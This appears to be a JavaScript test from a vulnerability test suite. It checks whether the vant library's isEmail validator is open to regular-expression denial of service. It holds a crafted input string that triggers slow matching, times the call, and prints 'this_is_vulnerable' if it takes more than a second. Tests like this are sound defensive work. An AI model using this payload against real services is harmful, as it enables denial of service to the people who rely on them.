// test("ReDos in vant", () => {
  const isEmail = require("vant/lib/utils/validate/email").isEmail;
  const measureTime = require("../utils").measureTime;
  let t = measureTime(function () {
    var check = isEmail(
      "a@0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0."
    );
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
